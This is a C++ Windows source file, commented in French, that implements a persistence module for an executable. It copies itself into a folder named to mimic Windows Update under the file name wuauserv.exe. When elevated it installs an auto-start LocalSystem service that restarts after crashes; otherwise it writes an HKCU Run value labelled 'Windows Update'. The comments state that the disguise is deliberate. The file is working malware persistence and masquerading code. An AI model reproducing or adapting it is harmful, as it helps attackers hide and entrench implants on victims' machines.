#include "persistence.h"
#include "config.h"
#include "error.h"
#include "log.h"
#include <windows.h>
#include <string>
#include <vector>

namespace {

constexpr DWORD   RecoveryDelayMs  = 5000;
constexpr DWORD   RecoveryResetDay = 86400;   // 1 jour, en secondes

// Emplacement plausible : ressemble a un composant de Windows Update.
constexpr wchar_t InstallDirSuffixW[] = L"\\Microsoft\\WindowsUpdate";
constexpr wchar_t InstallExeNameW[]   = L"wuauserv.exe";

// Persistance utilisateur : cle documentee, lue par l'Explorateur au logon.
constexpr wchar_t RunKeyPathW[]   = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
constexpr wchar_t RunValueNameW[] = L"Windows Update";

std::wstring current_exe_path() {
    wchar_t buffer[MAX_PATH] = {};
    if (GetModuleFileNameW(nullptr, buffer, MAX_PATH) == 0) {
        return {};
    }
    return buffer;
}

std::wstring env_path(const wchar_t* variable) {
    wchar_t buffer[MAX_PATH] = {};
    const DWORD size = GetEnvironmentVariableW(variable, buffer, MAX_PATH);
    if (size == 0 || size >= MAX_PATH) {
        return {};
    }
    return buffer;
}

bool same_path(const std::wstring& left, const std::wstring& right) {
    return CompareStringOrdinal(left.c_str(), -1, right.c_str(), -1, TRUE) == CSTR_EQUAL;
}

// Cree `dir` et ses parents si necessaire. CreateDirectoryW ne cree qu'un
// niveau : sur une cible ou %LOCALAPPDATA%\Microsoft n'existe pas encore, il
// echoue avec ERROR_PATH_NOT_FOUND.
bool ensure_directory(const std::wstring& dir) {
    if (CreateDirectoryW(dir.c_str(), nullptr)) {
        return true;
    }

    const DWORD err = GetLastError();
    if (err == ERROR_ALREADY_EXISTS) {
        return true;
    }
    if (err != ERROR_PATH_NOT_FOUND) {
        SetLastError(err);
        return false;
    }

    const size_t slash = dir.find_last_of(L"\\/");
    if (slash == std::wstring::npos) {
        SetLastError(err);
        return false;
    }

    const std::wstring parent = dir.substr(0, slash);
    if (!parent.empty() && !ensure_directory(parent)) {
        return false;
    }

    if (CreateDirectoryW(dir.c_str(), nullptr)) {
        return true;
    }
    const DWORD second = GetLastError();
    if (second == ERROR_ALREADY_EXISTS) {
        return true;
    }
    SetLastError(second);
    return false;
}

// Arrete le service s'il tourne : le binaire cible est sinon verrouille et
// CopyFileW echoue (ERROR_SHARING_VIOLATION).
void stop_service_for_update() {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) {
        return;
    }

    SC_HANDLE service = OpenServiceW(scm, ServiceNameW,
        SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (service) {
        SERVICE_STATUS status{};
        if (ControlService(service, SERVICE_CONTROL_STOP, &status)) {
            for (int i = 0; i < 50; ++i) {
                SERVICE_STATUS_PROCESS sp{};
                DWORD needed = 0;
                if (!QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,
                        reinterpret_cast<LPBYTE>(&sp), sizeof(sp), &needed)) {
                    break;
                }
                if (sp.dwCurrentState == SERVICE_STOPPED) {
                    break;
                }
                Sleep(100);
            }
        }
        CloseServiceHandle(service);
    }
    CloseServiceHandle(scm);
}

// Configure les recovery actions : redemarrage apres 5 s, 3 fois, reset 1 jour.
// Apres 3 crashs consecutifs le SCM abandonne (SC_ACTION_NONE implicite) et le
// service reste STOPPED jusqu'au prochain reboot (SERVICE_AUTO_START le relance
// alors). Le compteur se remet a 0 uniquement si le service tourne sans crasher
// pendant dwResetPeriod (86400 s).
bool apply_failure_actions(SC_HANDLE service) {
    SC_ACTION actions[3] = {};
    for (auto& a : actions) {
        a.Type  = SC_ACTION_RESTART;
        a.Delay = RecoveryDelayMs;
    }

    SERVICE_FAILURE_ACTIONSW sfa{};
    sfa.dwResetPeriod = RecoveryResetDay;
    sfa.cActions      = 3;
    sfa.lpsaActions   = actions;

    if (!ChangeServiceConfig2W(service, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa)) {
        log_line(format_error(GetLastError(), "ChangeServiceConfig2(FAILURE_ACTIONS)"));
        return false;
    }
    return true;
}

bool apply_description(SC_HANDLE service) {
    SERVICE_DESCRIPTIONW desc{};
    desc.lpDescription = const_cast<LPWSTR>(ServiceDescW);
    // Non bloquant : une description manquante n'empeche pas le service de tourner.
    return ChangeServiceConfig2W(service, SERVICE_CONFIG_DESCRIPTION, &desc) != 0;
}

// Copie l'executable courant vers `target` (le dossier est cree au besoin).
bool copy_self_to(const std::wstring& dir, const std::wstring& target) {
    const std::wstring exe = current_exe_path();
    if (exe.empty()) {
        log_line(format_last_error("GetModuleFileNameW"));
        return false;
    }
    if (same_path(exe, target)) {
        return true;   // deja installe a cet emplacement
    }

    if (!ensure_directory(dir)) {
        log_line(format_error(GetLastError(), "CreateDirectory(" + to_utf8(dir) + ")"));
        return false;
    }

    // Le fichier cible peut etre momentanement verrouille : arret du service en
    // cours, scan antivirus, instance precedente. On retente quelques fois
    // avant d'abandonner (ERROR_SHARING_VIOLATION / ERROR_LOCK_VIOLATION).
    constexpr int CopyAttempts = 10;
    constexpr DWORD CopyRetryMs = 300;

    DWORD last_error = ERROR_SUCCESS;
    for (int attempt = 0; attempt < CopyAttempts; ++attempt) {
        if (CopyFileW(exe.c_str(), target.c_str(), FALSE)) {
            log_line("copie installee : " + to_utf8(target));
            return true;
        }

        last_error = GetLastError();
        if (last_error != ERROR_SHARING_VIOLATION && last_error != ERROR_LOCK_VIOLATION) {
            break;
        }
        Sleep(CopyRetryMs);
    }

    SetLastError(last_error);
    log_line(format_error(last_error, "CopyFile(" + to_utf8(target) + ")"));
    return false;
}

// --- Chemin service (necessite l'elevation) --------------------------------
// %ProgramData%\Microsoft\WindowsUpdate\wuauserv.exe + service AUTO_START en
// LocalSystem. Demarre au boot, sans ouverture de session.
bool install_service_persistence() {
    const std::wstring target = installed_exe_path();
    if (target.empty()) {
        log_line("ProgramData introuvable");
        return false;
    }

    stop_service_for_update();   // libere le binaire cible s'il est en cours
    if (!copy_self_to(install_dir(), target)) {
        return false;
    }

    const std::wstring quoted_exe = L"\"" + target + L"\"";

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        log_line(format_last_error("OpenSCManager"));
        return false;
    }

    SC_HANDLE service = CreateServiceW(
        scm,
        ServiceNameW,
        ServiceDisplayNameW,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        quoted_exe.c_str(),
        nullptr, nullptr, nullptr,
        nullptr,                            // LocalSystem
        nullptr);

    bool created_now = true;
    if (!service) {
        const DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            // Idempotence : on rafraichit la config d'un service existant.
            created_now = false;
            service = OpenServiceW(scm, ServiceNameW,
                SERVICE_CHANGE_CONFIG | SERVICE_START);
            if (!service) {
                log_line(format_last_error("OpenService(existing)"));
                CloseServiceHandle(scm);
                return false;
            }
        }
        else {
            log_line(format_error(err, "CreateService"));
            CloseServiceHandle(scm);
            return false;
        }
    }

    // Sur un service existant, on aligne aussi le binaire et le type de demarrage
    // (utile si l'exe a ete deplace).
    if (!created_now) {
        if (!ChangeServiceConfigW(service,
                SERVICE_NO_CHANGE,
                SERVICE_AUTO_START,
                SERVICE_NO_CHANGE,
                quoted_exe.c_str(),
                nullptr, nullptr, nullptr, nullptr, nullptr,
                ServiceDisplayNameW)) {
            log_line(format_error(GetLastError(), "ChangeServiceConfig(binPath)"));
        }
    }

    const bool ok = apply_failure_actions(service);
    apply_description(service);   // best-effort

    // Demarrage immediat en Release (en Debug, on evite le doublon avec la console).
#ifdef NDEBUG
    SERVICE_STATUS_PROCESS status{};
    DWORD needed = 0;
    const bool status_ok = QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,
        reinterpret_cast<LPBYTE>(&status), sizeof(status), &needed) != 0;

    if (status_ok && status.dwCurrentState == SERVICE_RUNNING) {
        log_line("service deja en cours d'execution");
    }
    else {
        if (!StartServiceW(service, 0, nullptr)) {
            const DWORD err = GetLastError();
            if (err != ERROR_SERVICE_ALREADY_RUNNING) {
                log_line(format_error(err, "StartService"));
            }
        }
    }
#else
    log_line("mode Debug : service configure en AUTO_START (demarrera au reboot ou via sc start)");
#endif

    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    return ok;
}

// --- Chemin utilisateur (sans elevation) -----------------------------------
// %LOCALAPPDATA%\Microsoft\WindowsUpdate\wuauserv.exe + valeur HKCU\...\Run.
// Demarre a l'ouverture de session, dans le contexte de l'utilisateur.
bool install_user_persistence() {
    const std::wstring target = user_exe_path();
    if (target.empty()) {
        log_line("LOCALAPPDATA introuvable");
        return false;
    }

    if (!copy_self_to(user_install_dir(), target)) {
        return false;
    }

    HKEY key = nullptr;
    const LSTATUS opened = RegCreateKeyExW(HKEY_CURRENT_USER, RunKeyPathW, 0,
        nullptr, 0, KEY_SET_VALUE, nullptr, &key, nullptr);
    if (opened != ERROR_SUCCESS) {
        log_line(format_error(static_cast<unsigned long>(opened), "RegCreateKeyEx(Run)"));
        return false;
    }

    const DWORD bytes = static_cast<DWORD>((target.size() + 1) * sizeof(wchar_t));
    const LSTATUS written = RegSetValueExW(key, RunValueNameW, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(target.c_str()), bytes);
    RegCloseKey(key);

    if (written != ERROR_SUCCESS) {
        log_line(format_error(static_cast<unsigned long>(written), "RegSetValueEx(Run)"));
        return false;
    }

    log_line("persistance utilisateur installee (HKCU\\...\\Run)");
    return true;
}

}  // namespace

std::wstring install_dir() {
    const std::wstring program_data = env_path(L"ProgramData");
    return program_data.empty() ? std::wstring() : program_data + InstallDirSuffixW;
}

std::wstring installed_exe_path() {
    const std::wstring dir = install_dir();
    return dir.empty() ? std::wstring() : dir + L"\\" + InstallExeNameW;
}

std::wstring user_install_dir() {
    const std::wstring local = env_path(L"LOCALAPPDATA");
    return local.empty() ? std::wstring() : local + InstallDirSuffixW;
}

std::wstring user_exe_path() {
    const std::wstring dir = user_install_dir();
    return dir.empty() ? std::wstring() : dir + L"\\" + InstallExeNameW;
}

bool process_is_elevated() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        return false;
    }

    TOKEN_ELEVATION elevation{};
    DWORD size = sizeof(elevation);
    const bool ok = GetTokenInformation(token, TokenElevation,
        &elevation, sizeof(elevation), &size) != 0;
    CloseHandle(token);
    return ok && elevation.TokenIsElevated != 0;
}

// Diagnostic (Debug) : pourquoi une ecriture peut etre refusee alors que
// l'utilisateur en a le droit. Affiche le niveau d'integration du jeton, le
// nombre de SIDs restreints, et sonde une ecriture dans %TEMP%.
void log_token_context() {
#ifndef NDEBUG
    wchar_t probe_dir[MAX_PATH] = {};
    if (GetEnvironmentVariableW(L"TEMP", probe_dir, MAX_PATH) > 0) {
        const std::wstring probe = std::wstring(probe_dir) + L"\\s0p_probe";
        if (CreateDirectoryW(probe.c_str(), nullptr)) {
            log_line("sonde %TEMP% : ecriture OK");
            RemoveDirectoryW(probe.c_str());
        }
        else if (GetLastError() == ERROR_ALREADY_EXISTS) {
            log_line("sonde %TEMP% : dossier deja present");
        }
        else {
            log_line(format_error(GetLastError(), "sonde %TEMP%"));
        }
    }

    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        return;
    }

    DWORD size = 0;
    GetTokenInformation(token, TokenIntegrityLevel, nullptr, 0, &size);
    if (size > 0) {
        std::vector<unsigned char> buffer(size);
        if (GetTokenInformation(token, TokenIntegrityLevel, &buffer[0], size, &size)) {
            auto* label = reinterpret_cast<TOKEN_MANDATORY_LABEL*>(&buffer[0]);
            const DWORD* rid = GetSidSubAuthority(label->Label.Sid,
                static_cast<DWORD>(*GetSidSubAuthorityCount(label->Label.Sid) - 1));
            const char* name = (*rid >= SECURITY_MANDATORY_HIGH_RID) ? "high"
                : (*rid >= SECURITY_MANDATORY_MEDIUM_RID) ? "medium"
                : (*rid >= SECURITY_MANDATORY_LOW_RID) ? "low" : "inconnu";

            char hex[16] = {};
            snprintf(hex, sizeof(hex), "0x%lX", *rid);
            log_line(std::string("integrite du jeton : ") + name + " (" + hex + ")");
        }
    }

    DWORD restricted_size = 0;
    GetTokenInformation(token, TokenRestrictedSids, nullptr, 0, &restricted_size);
    const size_t count = restricted_size / sizeof(SID_AND_ATTRIBUTES);
    log_line("sids restreints : " + std::to_string(count));

    CloseHandle(token);
#endif
}

bool install_persistence() {
    log_token_context();

    // La politique : le contexte decide de la persistance possible.
    // ProgramData + service exigent l'elevation ; sinon repli utilisateur.
    if (process_is_elevated()) {
        log_line("contexte eleve : persistance service");
        if (install_service_persistence()) {
            return true;
        }
        log_line("chemin service en echec, repli utilisateur");
    }
    else {
        log_line("contexte utilisateur : persistance HKCU\\Run");
    }
    return install_user_persistence();
}

void remove_user_persistence() {
    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, RunKeyPathW, 0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
        RegDeleteValueW(key, RunValueNameW);
        RegCloseKey(key);
    }

    const std::wstring target = user_exe_path();
    if (target.empty()) {
        return;
    }

    if (!DeleteFileW(target.c_str())) {
        MoveFileExW(target.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
    RemoveDirectoryW(user_install_dir().c_str());   // echoue si non vide : sans consequence
}
